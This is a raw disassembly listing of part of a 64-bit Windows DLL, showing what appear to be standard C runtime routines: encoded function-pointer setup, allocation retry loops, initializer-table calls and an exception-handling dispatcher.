   180009e1d:	48 33 05 dc f1 00 00 	xor    0xf1dc(%rip),%rax        # 0x180019000
   180009e24:	48 8b cb             	mov    %rbx,%rcx
   180009e27:	48 89 05 b2 2c 01 00 	mov    %rax,0x12cb2(%rip)        # 0x18001cae0
   180009e2e:	ff 15 24 72 00 00    	call   *0x7224(%rip)        # 0x180011058
   180009e34:	48 8d 15 bd 8b 00 00 	lea    0x8bbd(%rip),%rdx        # 0x1800129f8
   180009e3b:	48 33 05 be f1 00 00 	xor    0xf1be(%rip),%rax        # 0x180019000
   180009e42:	48 8b cb             	mov    %rbx,%rcx
   180009e45:	48 89 05 9c 2c 01 00 	mov    %rax,0x12c9c(%rip)        # 0x18001cae8
   180009e4c:	ff 15 06 72 00 00    	call   *0x7206(%rip)        # 0x180011058
   180009e52:	48 8d 15 bf 8b 00 00 	lea    0x8bbf(%rip),%rdx        # 0x180012a18
   180009e59:	48 33 05 a0 f1 00 00 	xor    0xf1a0(%rip),%rax        # 0x180019000
   180009e60:	48 8b cb             	mov    %rbx,%rcx
   180009e63:	48 89 05 86 2c 01 00 	mov    %rax,0x12c86(%rip)        # 0x18001caf0
   180009e6a:	ff 15 e8 71 00 00    	call   *0x71e8(%rip)        # 0x180011058
   180009e70:	48 8d 15 b9 8b 00 00 	lea    0x8bb9(%rip),%rdx        # 0x180012a30
   180009e77:	48 33 05 82 f1 00 00 	xor    0xf182(%rip),%rax        # 0x180019000
   180009e7e:	48 8b cb             	mov    %rbx,%rcx
   180009e81:	48 89 05 70 2c 01 00 	mov    %rax,0x12c70(%rip)        # 0x18001caf8
   180009e88:	ff 15 ca 71 00 00    	call   *0x71ca(%rip)        # 0x180011058
   180009e8e:	48 8d 15 b3 8b 00 00 	lea    0x8bb3(%rip),%rdx        # 0x180012a48
   180009e95:	48 33 05 64 f1 00 00 	xor    0xf164(%rip),%rax        # 0x180019000
   180009e9c:	48 8b cb             	mov    %rbx,%rcx
   180009e9f:	48 89 05 5a 2c 01 00 	mov    %rax,0x12c5a(%rip)        # 0x18001cb00
   180009ea6:	ff 15 ac 71 00 00    	call   *0x71ac(%rip)        # 0x180011058
   180009eac:	48 8d 15 ad 8b 00 00 	lea    0x8bad(%rip),%rdx        # 0x180012a60
   180009eb3:	48 33 05 46 f1 00 00 	xor    0xf146(%rip),%rax        # 0x180019000
   180009eba:	48 8b cb             	mov    %rbx,%rcx
   180009ebd:	48 89 05 44 2c 01 00 	mov    %rax,0x12c44(%rip)        # 0x18001cb08
   180009ec4:	ff 15 8e 71 00 00    	call   *0x718e(%rip)        # 0x180011058
   180009eca:	48 8d 15 a7 8b 00 00 	lea    0x8ba7(%rip),%rdx        # 0x180012a78
   180009ed1:	48 33 05 28 f1 00 00 	xor    0xf128(%rip),%rax        # 0x180019000
   180009ed8:	48 8b cb             	mov    %rbx,%rcx
   180009edb:	48 89 05 2e 2c 01 00 	mov    %rax,0x12c2e(%rip)        # 0x18001cb10
   180009ee2:	ff 15 70 71 00 00    	call   *0x7170(%rip)        # 0x180011058
   180009ee8:	48 33 05 11 f1 00 00 	xor    0xf111(%rip),%rax        # 0x180019000
   180009eef:	48 8d 15 a2 8b 00 00 	lea    0x8ba2(%rip),%rdx        # 0x180012a98
   180009ef6:	48 8b cb             	mov    %rbx,%rcx
   180009ef9:	48 89 05 18 2c 01 00 	mov    %rax,0x12c18(%rip)        # 0x18001cb18
   180009f00:	ff 15 52 71 00 00    	call   *0x7152(%rip)        # 0x180011058
   180009f06:	48 8d 15 ab 8b 00 00 	lea    0x8bab(%rip),%rdx        # 0x180012ab8
   180009f0d:	48 33 05 ec f0 00 00 	xor    0xf0ec(%rip),%rax        # 0x180019000
   180009f14:	48 8b cb             	mov    %rbx,%rcx
   180009f17:	48 89 05 02 2c 01 00 	mov    %rax,0x12c02(%rip)        # 0x18001cb20
   180009f1e:	ff 15 34 71 00 00    	call   *0x7134(%rip)        # 0x180011058
   180009f24:	48 8d 15 ad 8b 00 00 	lea    0x8bad(%rip),%rdx        # 0x180012ad8
   180009f2b:	48 33 05 ce f0 00 00 	xor    0xf0ce(%rip),%rax        # 0x180019000
   180009f32:	48 8b cb             	mov    %rbx,%rcx
   180009f35:	48 89 05 ec 2b 01 00 	mov    %rax,0x12bec(%rip)        # 0x18001cb28
   180009f3c:	ff 15 16 71 00 00    	call   *0x7116(%rip)        # 0x180011058
   180009f42:	48 8d 15 af 8b 00 00 	lea    0x8baf(%rip),%rdx        # 0x180012af8
   180009f49:	48 33 05 b0 f0 00 00 	xor    0xf0b0(%rip),%rax        # 0x180019000
   180009f50:	48 8b cb             	mov    %rbx,%rcx
   180009f53:	48 89 05 d6 2b 01 00 	mov    %rax,0x12bd6(%rip)        # 0x18001cb30
   180009f5a:	ff 15 f8 70 00 00    	call   *0x70f8(%rip)        # 0x180011058
   180009f60:	48 8d 15 a9 8b 00 00 	lea    0x8ba9(%rip),%rdx        # 0x180012b10
   180009f67:	48 33 05 92 f0 00 00 	xor    0xf092(%rip),%rax        # 0x180019000
   180009f6e:	48 8b cb             	mov    %rbx,%rcx
   180009f71:	48 89 05 c0 2b 01 00 	mov    %rax,0x12bc0(%rip)        # 0x18001cb38
   180009f78:	ff 15 da 70 00 00    	call   *0x70da(%rip)        # 0x180011058
   180009f7e:	48 8d 15 ab 8b 00 00 	lea    0x8bab(%rip),%rdx        # 0x180012b30
   180009f85:	48 33 05 74 f0 00 00 	xor    0xf074(%rip),%rax        # 0x180019000
   180009f8c:	48 8b cb             	mov    %rbx,%rcx
   180009f8f:	48 89 05 aa 2b 01 00 	mov    %rax,0x12baa(%rip)        # 0x18001cb40
   180009f96:	ff 15 bc 70 00 00    	call   *0x70bc(%rip)        # 0x180011058
   180009f9c:	48 8d 15 a5 8b 00 00 	lea    0x8ba5(%rip),%rdx        # 0x180012b48
   180009fa3:	48 33 05 56 f0 00 00 	xor    0xf056(%rip),%rax        # 0x180019000
   180009faa:	48 8b cb             	mov    %rbx,%rcx
   180009fad:	48 89 05 9c 2b 01 00 	mov    %rax,0x12b9c(%rip)        # 0x18001cb50
   180009fb4:	ff 15 9e 70 00 00    	call   *0x709e(%rip)        # 0x180011058
   180009fba:	48 8d 15 97 8b 00 00 	lea    0x8b97(%rip),%rdx        # 0x180012b58
   180009fc1:	48 33 05 38 f0 00 00 	xor    0xf038(%rip),%rax        # 0x180019000
   180009fc8:	48 8b cb             	mov    %rbx,%rcx
   180009fcb:	48 89 05 76 2b 01 00 	mov    %rax,0x12b76(%rip)        # 0x18001cb48
   180009fd2:	ff 15 80 70 00 00    	call   *0x7080(%rip)        # 0x180011058
   180009fd8:	48 8d 15 89 8b 00 00 	lea    0x8b89(%rip),%rdx        # 0x180012b68
   180009fdf:	48 33 05 1a f0 00 00 	xor    0xf01a(%rip),%rax        # 0x180019000
   180009fe6:	48 8b cb             	mov    %rbx,%rcx
   180009fe9:	48 89 05 68 2b 01 00 	mov    %rax,0x12b68(%rip)        # 0x18001cb58
   180009ff0:	ff 15 62 70 00 00    	call   *0x7062(%rip)        # 0x180011058
   180009ff6:	48 8d 15 7b 8b 00 00 	lea    0x8b7b(%rip),%rdx        # 0x180012b78
   180009ffd:	48 33 05 fc ef 00 00 	xor    0xeffc(%rip),%rax        # 0x180019000
   18000a004:	48 8b cb             	mov    %rbx,%rcx
   18000a007:	48 89 05 52 2b 01 00 	mov    %rax,0x12b52(%rip)        # 0x18001cb60
   18000a00e:	ff 15 44 70 00 00    	call   *0x7044(%rip)        # 0x180011058
   18000a014:	48 8d 15 6d 8b 00 00 	lea    0x8b6d(%rip),%rdx        # 0x180012b88
   18000a01b:	48 33 05 de ef 00 00 	xor    0xefde(%rip),%rax        # 0x180019000
   18000a022:	48 8b cb             	mov    %rbx,%rcx
   18000a025:	48 89 05 3c 2b 01 00 	mov    %rax,0x12b3c(%rip)        # 0x18001cb68
   18000a02c:	ff 15 26 70 00 00    	call   *0x7026(%rip)        # 0x180011058
   18000a032:	48 8d 15 6f 8b 00 00 	lea    0x8b6f(%rip),%rdx        # 0x180012ba8
   18000a039:	48 33 05 c0 ef 00 00 	xor    0xefc0(%rip),%rax        # 0x180019000
   18000a040:	48 8b cb             	mov    %rbx,%rcx
   18000a043:	48 89 05 26 2b 01 00 	mov    %rax,0x12b26(%rip)        # 0x18001cb70
   18000a04a:	ff 15 08 70 00 00    	call   *0x7008(%rip)        # 0x180011058
   18000a050:	48 8d 15 69 8b 00 00 	lea    0x8b69(%rip),%rdx        # 0x180012bc0
   18000a057:	48 33 05 a2 ef 00 00 	xor    0xefa2(%rip),%rax        # 0x180019000
   18000a05e:	48 8b cb             	mov    %rbx,%rcx
   18000a061:	48 89 05 10 2b 01 00 	mov    %rax,0x12b10(%rip)        # 0x18001cb78
   18000a068:	ff 15 ea 6f 00 00    	call   *0x6fea(%rip)        # 0x180011058
   18000a06e:	48 8d 15 5b 8b 00 00 	lea    0x8b5b(%rip),%rdx        # 0x180012bd0
   18000a075:	48 33 05 84 ef 00 00 	xor    0xef84(%rip),%rax        # 0x180019000
   18000a07c:	48 8b cb             	mov    %rbx,%rcx
   18000a07f:	48 89 05 fa 2a 01 00 	mov    %rax,0x12afa(%rip)        # 0x18001cb80
   18000a086:	ff 15 cc 6f 00 00    	call   *0x6fcc(%rip)        # 0x180011058
   18000a08c:	48 8d 15 55 8b 00 00 	lea    0x8b55(%rip),%rdx        # 0x180012be8
   18000a093:	48 33 05 66 ef 00 00 	xor    0xef66(%rip),%rax        # 0x180019000
   18000a09a:	48 8b cb             	mov    %rbx,%rcx
   18000a09d:	48 89 05 e4 2a 01 00 	mov    %rax,0x12ae4(%rip)        # 0x18001cb88
   18000a0a4:	ff 15 ae 6f 00 00    	call   *0x6fae(%rip)        # 0x180011058
   18000a0aa:	48 8d 15 47 8b 00 00 	lea    0x8b47(%rip),%rdx        # 0x180012bf8
   18000a0b1:	48 33 05 48 ef 00 00 	xor    0xef48(%rip),%rax        # 0x180019000
   18000a0b8:	48 8b cb             	mov    %rbx,%rcx
   18000a0bb:	48 89 05 ce 2a 01 00 	mov    %rax,0x12ace(%rip)        # 0x18001cb90
   18000a0c2:	ff 15 90 6f 00 00    	call   *0x6f90(%rip)        # 0x180011058
   18000a0c8:	48 33 05 31 ef 00 00 	xor    0xef31(%rip),%rax        # 0x180019000
   18000a0cf:	48 8d 15 42 8b 00 00 	lea    0x8b42(%rip),%rdx        # 0x180012c18
   18000a0d6:	48 8b cb             	mov    %rbx,%rcx
   18000a0d9:	48 89 05 b8 2a 01 00 	mov    %rax,0x12ab8(%rip)        # 0x18001cb98
   18000a0e0:	ff 15 72 6f 00 00    	call   *0x6f72(%rip)        # 0x180011058
   18000a0e6:	48 33 05 13 ef 00 00 	xor    0xef13(%rip),%rax        # 0x180019000
   18000a0ed:	48 89 05 ac 2a 01 00 	mov    %rax,0x12aac(%rip)        # 0x18001cba0
   18000a0f4:	48 83 c4 20          	add    $0x20,%rsp
   18000a0f8:	5b                   	pop    %rbx
   18000a0f9:	c3                   	ret
   18000a0fa:	cc                   	int3
   18000a0fb:	cc                   	int3
   18000a0fc:	48 ff 25 95 70 00 00 	rex.W jmp *0x7095(%rip)        # 0x180011198
   18000a103:	cc                   	int3
   18000a104:	40 53                	rex push %rbx
   18000a106:	48 83 ec 20          	sub    $0x20,%rsp
   18000a10a:	8b d9                	mov    %ecx,%ebx
   18000a10c:	ff 15 8e 70 00 00    	call   *0x708e(%rip)        # 0x1800111a0
   18000a112:	8b d3                	mov    %ebx,%edx
   18000a114:	48 8b c8             	mov    %rax,%rcx
   18000a117:	48 83 c4 20          	add    $0x20,%rsp
   18000a11b:	5b                   	pop    %rbx
   18000a11c:	48 ff 25 85 70 00 00 	rex.W jmp *0x7085(%rip)        # 0x1800111a8
   18000a123:	cc                   	int3
   18000a124:	40 53                	rex push %rbx
   18000a126:	48 83 ec 20          	sub    $0x20,%rsp
   18000a12a:	48 8b d9             	mov    %rcx,%rbx
   18000a12d:	33 c9                	xor    %ecx,%ecx
   18000a12f:	ff 15 53 70 00 00    	call   *0x7053(%rip)        # 0x180011188
   18000a135:	48 8b cb             	mov    %rbx,%rcx
   18000a138:	48 83 c4 20          	add    $0x20,%rsp
   18000a13c:	5b                   	pop    %rbx
   18000a13d:	48 ff 25 3c 70 00 00 	rex.W jmp *0x703c(%rip)        # 0x180011180
   18000a144:	48 8b c4             	mov    %rsp,%rax
   18000a147:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000a14b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000a14f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000a153:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000a157:	41 56                	push   %r14
   18000a159:	48 83 ec 20          	sub    $0x20,%rsp
   18000a15d:	33 db                	xor    %ebx,%ebx
   18000a15f:	48 8b f2             	mov    %rdx,%rsi
   18000a162:	48 8b e9             	mov    %rcx,%rbp
   18000a165:	41 83 ce ff          	or     $0xffffffff,%r14d
   18000a169:	45 33 c0             	xor    %r8d,%r8d
   18000a16c:	48 8b d6             	mov    %rsi,%rdx
   18000a16f:	48 8b cd             	mov    %rbp,%rcx
   18000a172:	e8 35 29 00 00       	call   0x18000caac
   18000a177:	48 8b f8             	mov    %rax,%rdi
   18000a17a:	48 85 c0             	test   %rax,%rax
   18000a17d:	75 26                	jne    0x18000a1a5
   18000a17f:	39 05 03 16 01 00    	cmp    %eax,0x11603(%rip)        # 0x18001b788
   18000a185:	76 1e                	jbe    0x18000a1a5
   18000a187:	8b cb                	mov    %ebx,%ecx
   18000a189:	e8 6e ff ff ff       	call   0x18000a0fc
   18000a18e:	8d 8b e8 03 00 00    	lea    0x3e8(%rbx),%ecx
   18000a194:	3b 0d ee 15 01 00    	cmp    0x115ee(%rip),%ecx        # 0x18001b788
   18000a19a:	8b d9                	mov    %ecx,%ebx
   18000a19c:	41 0f 47 de          	cmova  %r14d,%ebx
   18000a1a0:	41 3b de             	cmp    %r14d,%ebx
   18000a1a3:	75 c4                	jne    0x18000a169
   18000a1a5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a1aa:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000a1af:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000a1b4:	48 8b c7             	mov    %rdi,%rax
   18000a1b7:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000a1bc:	48 83 c4 20          	add    $0x20,%rsp
   18000a1c0:	41 5e                	pop    %r14
   18000a1c2:	c3                   	ret
   18000a1c3:	cc                   	int3
   18000a1c4:	48 8b c4             	mov    %rsp,%rax
   18000a1c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000a1cb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000a1cf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000a1d3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000a1d7:	41 56                	push   %r14
   18000a1d9:	48 83 ec 20          	sub    $0x20,%rsp
   18000a1dd:	8b 35 a5 15 01 00    	mov    0x115a5(%rip),%esi        # 0x18001b788
   18000a1e3:	33 db                	xor    %ebx,%ebx
   18000a1e5:	48 8b e9             	mov    %rcx,%rbp
   18000a1e8:	41 83 ce ff          	or     $0xffffffff,%r14d
   18000a1ec:	48 8b cd             	mov    %rbp,%rcx
   18000a1ef:	e8 cc b3 ff ff       	call   0x1800055c0
   18000a1f4:	48 8b f8             	mov    %rax,%rdi
   18000a1f7:	48 85 c0             	test   %rax,%rax
   18000a1fa:	75 24                	jne    0x18000a220
   18000a1fc:	85 f6                	test   %esi,%esi
   18000a1fe:	74 20                	je     0x18000a220
   18000a200:	8b cb                	mov    %ebx,%ecx
   18000a202:	e8 f5 fe ff ff       	call   0x18000a0fc
   18000a207:	8b 35 7b 15 01 00    	mov    0x1157b(%rip),%esi        # 0x18001b788
   18000a20d:	8d 8b e8 03 00 00    	lea    0x3e8(%rbx),%ecx
   18000a213:	3b ce                	cmp    %esi,%ecx
   18000a215:	8b d9                	mov    %ecx,%ebx
   18000a217:	41 0f 47 de          	cmova  %r14d,%ebx
   18000a21b:	41 3b de             	cmp    %r14d,%ebx
   18000a21e:	75 cc                	jne    0x18000a1ec
   18000a220:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a225:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000a22a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000a22f:	48 8b c7             	mov    %rdi,%rax
   18000a232:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000a237:	48 83 c4 20          	add    $0x20,%rsp
   18000a23b:	41 5e                	pop    %r14
   18000a23d:	c3                   	ret
   18000a23e:	cc                   	int3
   18000a23f:	cc                   	int3
   18000a240:	48 8b c4             	mov    %rsp,%rax
   18000a243:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000a247:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000a24b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000a24f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000a253:	41 56                	push   %r14
   18000a255:	48 83 ec 20          	sub    $0x20,%rsp
   18000a259:	33 db                	xor    %ebx,%ebx
   18000a25b:	48 8b f2             	mov    %rdx,%rsi
   18000a25e:	48 8b e9             	mov    %rcx,%rbp
   18000a261:	41 83 ce ff          	or     $0xffffffff,%r14d
   18000a265:	48 8b d6             	mov    %rsi,%rdx
   18000a268:	48 8b cd             	mov    %rbp,%rcx
   18000a26b:	e8 68 27 00 00       	call   0x18000c9d8
   18000a270:	48 8b f8             	mov    %rax,%rdi
   18000a273:	48 85 c0             	test   %rax,%rax
   18000a276:	75 2b                	jne    0x18000a2a3
   18000a278:	48 85 f6             	test   %rsi,%rsi
   18000a27b:	74 26                	je     0x18000a2a3
   18000a27d:	39 05 05 15 01 00    	cmp    %eax,0x11505(%rip)        # 0x18001b788
   18000a283:	76 1e                	jbe    0x18000a2a3
   18000a285:	8b cb                	mov    %ebx,%ecx
   18000a287:	e8 70 fe ff ff       	call   0x18000a0fc
   18000a28c:	8d 8b e8 03 00 00    	lea    0x3e8(%rbx),%ecx
   18000a292:	3b 0d f0 14 01 00    	cmp    0x114f0(%rip),%ecx        # 0x18001b788
   18000a298:	8b d9                	mov    %ecx,%ebx
   18000a29a:	41 0f 47 de          	cmova  %r14d,%ebx
   18000a29e:	41 3b de             	cmp    %r14d,%ebx
   18000a2a1:	75 c2                	jne    0x18000a265
   18000a2a3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a2a8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000a2ad:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000a2b2:	48 8b c7             	mov    %rdi,%rax
   18000a2b5:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000a2ba:	48 83 c4 20          	add    $0x20,%rsp
   18000a2be:	41 5e                	pop    %r14
   18000a2c0:	c3                   	ret
   18000a2c1:	cc                   	int3
   18000a2c2:	cc                   	int3
   18000a2c3:	cc                   	int3
   18000a2c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a2c9:	57                   	push   %rdi
   18000a2ca:	48 83 ec 20          	sub    $0x20,%rsp
   18000a2ce:	48 8d 1d 83 c6 00 00 	lea    0xc683(%rip),%rbx        # 0x180016958
   18000a2d5:	48 8d 3d 7c c6 00 00 	lea    0xc67c(%rip),%rdi        # 0x180016958
   18000a2dc:	eb 0e                	jmp    0x18000a2ec
   18000a2de:	48 8b 03             	mov    (%rbx),%rax
   18000a2e1:	48 85 c0             	test   %rax,%rax
   18000a2e4:	74 02                	je     0x18000a2e8
   18000a2e6:	ff d0                	call   *%rax
   18000a2e8:	48 83 c3 08          	add    $0x8,%rbx
   18000a2ec:	48 3b df             	cmp    %rdi,%rbx
   18000a2ef:	72 ed                	jb     0x18000a2de
   18000a2f1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a2f6:	48 83 c4 20          	add    $0x20,%rsp
   18000a2fa:	5f                   	pop    %rdi
   18000a2fb:	c3                   	ret
   18000a2fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a301:	57                   	push   %rdi
   18000a302:	48 83 ec 20          	sub    $0x20,%rsp
   18000a306:	48 8d 1d 5b c6 00 00 	lea    0xc65b(%rip),%rbx        # 0x180016968
   18000a30d:	48 8d 3d 54 c6 00 00 	lea    0xc654(%rip),%rdi        # 0x180016968
   18000a314:	eb 0e                	jmp    0x18000a324
   18000a316:	48 8b 03             	mov    (%rbx),%rax
   18000a319:	48 85 c0             	test   %rax,%rax
   18000a31c:	74 02                	je     0x18000a320
   18000a31e:	ff d0                	call   *%rax
   18000a320:	48 83 c3 08          	add    $0x8,%rbx
   18000a324:	48 3b df             	cmp    %rdi,%rbx
   18000a327:	72 ed                	jb     0x18000a316
   18000a329:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a32e:	48 83 c4 20          	add    $0x20,%rsp
   18000a332:	5f                   	pop    %rdi
   18000a333:	c3                   	ret
   18000a334:	48 8b c4             	mov    %rsp,%rax
   18000a337:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000a33b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000a33f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000a343:	57                   	push   %rdi
   18000a344:	41 54                	push   %r12
   18000a346:	41 55                	push   %r13
   18000a348:	41 56                	push   %r14
   18000a34a:	41 57                	push   %r15
   18000a34c:	48 83 ec 40          	sub    $0x40,%rsp
   18000a350:	4d 8b 61 08          	mov    0x8(%r9),%r12
   18000a354:	4d 8b 39             	mov    (%r9),%r15
   18000a357:	49 8b 59 38          	mov    0x38(%r9),%rbx
   18000a35b:	4d 2b fc             	sub    %r12,%r15
   18000a35e:	f6 41 04 66          	testb  $0x66,0x4(%rcx)
   18000a362:	4d 8b f1             	mov    %r9,%r14
   18000a365:	4c 8b ea             	mov    %rdx,%r13
   18000a368:	48 8b e9             	mov    %rcx,%rbp
   18000a36b:	0f 85 de 00 00 00    	jne    0x18000a44f
   18000a371:	41 8b 71 48          	mov    0x48(%r9),%esi
   18000a375:	48 89 48 c8          	mov    %rcx,-0x38(%rax)
   18000a379:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   18000a37d:	3b 33                	cmp    (%rbx),%esi
   18000a37f:	0f 83 6d 01 00 00    	jae    0x18000a4f2
   18000a385:	8b fe                	mov    %esi,%edi
   18000a387:	48 03 ff             	add    %rdi,%rdi
   18000a38a:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   18000a38e:	4c 3b f8             	cmp    %rax,%r15
   18000a391:	0f 82 aa 00 00 00    	jb     0x18000a441
   18000a397:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   18000a39b:	4c 3b f8             	cmp    %rax,%r15
   18000a39e:	0f 83 9d 00 00 00    	jae    0x18000a441
   18000a3a4:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   18000a3a9:	0f 84 92 00 00 00    	je     0x18000a441
   18000a3af:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   18000a3b4:	74 17                	je     0x18000a3cd
   18000a3b6:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   18000a3ba:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000a3bf:	49 8b d5             	mov    %r13,%rdx
   18000a3c2:	49 03 c4             	add    %r12,%rax
   18000a3c5:	ff d0                	call   *%rax
   18000a3c7:	85 c0                	test   %eax,%eax
   18000a3c9:	78 7d                	js     0x18000a448
   18000a3cb:	7e 74                	jle    0x18000a441
   18000a3cd:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   18000a3d4:	75 28                	jne    0x18000a3fe
   18000a3d6:	48 83 3d aa 26 01 00 	cmpq   $0x0,0x126aa(%rip)        # 0x18001ca88
   18000a3dd:	00 
   18000a3de:	74 1e                	je     0x18000a3fe
   18000a3e0:	48 8d 0d a1 26 01 00 	lea    0x126a1(%rip),%rcx        # 0x18001ca88
   18000a3e7:	e8 84 0b 00 00       	call   0x18000af70
   18000a3ec:	85 c0                	test   %eax,%eax
   18000a3ee:	74 0e                	je     0x18000a3fe
   18000a3f0:	ba 01 00 00 00       	mov    $0x1,%edx
   18000a3f5:	48 8b cd             	mov    %rbp,%rcx
   18000a3f8:	ff 15 8a 26 01 00    	call   *0x1268a(%rip)        # 0x18001ca88
   18000a3fe:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   18000a402:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000a408:	49 8b d5             	mov    %r13,%rdx
   18000a40b:	49 03 cc             	add    %r12,%rcx
   18000a40e:	e8 2d 23 00 00       	call   0x18000c740
   18000a413:	49 8b 46 40          	mov    0x40(%r14),%rax
   18000a417:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   18000a41b:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   18000a41f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000a424:	49 8b 46 28          	mov    0x28(%r14),%rax
   18000a428:	49 03 d4             	add    %r12,%rdx
   18000a42b:	4c 8b c5             	mov    %rbp,%r8
   18000a42e:	49 8b cd             	mov    %r13,%rcx
   18000a431:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000a436:	ff 15 9c 6d 00 00    	call   *0x6d9c(%rip)        # 0x1800111d8
   18000a43c:	e8 2f 23 00 00       	call   0x18000c770
   18000a441:	ff c6                	inc    %esi
   18000a443:	e9 35 ff ff ff       	jmp    0x18000a37d
   18000a448:	33 c0                	xor    %eax,%eax
   18000a44a:	e9 a8 00 00 00       	jmp    0x18000a4f7
   18000a44f:	49 8b 71 20          	mov    0x20(%r9),%rsi
   18000a453:	41 8b 79 48          	mov    0x48(%r9),%edi
   18000a457:	49 2b f4             	sub    %r12,%rsi
   18000a45a:	e9 89 00 00 00       	jmp    0x18000a4e8
   18000a45f:	8b cf                	mov    %edi,%ecx
   18000a461:	48 03 c9             	add    %rcx,%rcx
   18000a464:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   18000a468:	4c 3b f8             	cmp    %rax,%r15
   18000a46b:	72 79                	jb     0x18000a4e6
   18000a46d:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   18000a471:	4c 3b f8             	cmp    %rax,%r15
   18000a474:	73 70                	jae    0x18000a4e6
   18000a476:	f6 45 04 20          	testb  $0x20,0x4(%rbp)
   18000a47a:	74 44                	je     0x18000a4c0
   18000a47c:	45 33 c9             	xor    %r9d,%r9d
   18000a47f:	85 d2                	test   %edx,%edx
   18000a481:	74 38                	je     0x18000a4bb
   18000a483:	45 8b c1             	mov    %r9d,%r8d
   18000a486:	4d 03 c0             	add    %r8,%r8
   18000a489:	42 8b 44 c3 04       	mov    0x4(%rbx,%r8,8),%eax
   18000a48e:	48 3b f0             	cmp    %rax,%rsi
   18000a491:	72 20                	jb     0x18000a4b3
   18000a493:	42 8b 44 c3 08       	mov    0x8(%rbx,%r8,8),%eax
   18000a498:	48 3b f0             	cmp    %rax,%rsi
   18000a49b:	73 16                	jae    0x18000a4b3
   18000a49d:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   18000a4a1:	42 39 44 c3 10       	cmp    %eax,0x10(%rbx,%r8,8)
   18000a4a6:	75 0b                	jne    0x18000a4b3
   18000a4a8:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   18000a4ac:	42 39 44 c3 0c       	cmp    %eax,0xc(%rbx,%r8,8)
   18000a4b1:	74 08                	je     0x18000a4bb
   18000a4b3:	41 ff c1             	inc    %r9d
   18000a4b6:	44 3b ca             	cmp    %edx,%r9d
   18000a4b9:	72 c8                	jb     0x18000a483
   18000a4bb:	44 3b ca             	cmp    %edx,%r9d
   18000a4be:	75 32                	jne    0x18000a4f2
   18000a4c0:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   18000a4c4:	85 c0                	test   %eax,%eax
   18000a4c6:	74 07                	je     0x18000a4cf
   18000a4c8:	48 3b f0             	cmp    %rax,%rsi
   18000a4cb:	74 25                	je     0x18000a4f2
   18000a4cd:	eb 17                	jmp    0x18000a4e6
   18000a4cf:	8d 47 01             	lea    0x1(%rdi),%eax
   18000a4d2:	49 8b d5             	mov    %r13,%rdx
   18000a4d5:	41 89 46 48          	mov    %eax,0x48(%r14)
   18000a4d9:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   18000a4de:	b1 01                	mov    $0x1,%cl
   18000a4e0:	4d 03 c4             	add    %r12,%r8
   18000a4e3:	41 ff d0             	call   *%r8
   18000a4e6:	ff c7                	inc    %edi
   18000a4e8:	8b 13                	mov    (%rbx),%edx
   18000a4ea:	3b fa                	cmp    %edx,%edi
   18000a4ec:	0f 82 6d ff ff ff    	jb     0x18000a45f
   18000a4f2:	b8 01 00 00 00       	mov    $0x1,%eax
   18000a4f7:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   18000a4fc:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   18000a500:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   18000a504:	49 8b 73 40          	mov    0x40(%r11),%rsi
   18000a508:	49 8b e3             	mov    %r11,%rsp
   18000a50b:	41 5f                	pop    %r15
   18000a50d:	41 5e                	pop    %r14
   18000a50f:	41 5d                	pop    %r13
   18000a511:	41 5c                	pop    %r12
   18000a513:	5f                   	pop    %rdi
   18000a514:	c3                   	ret
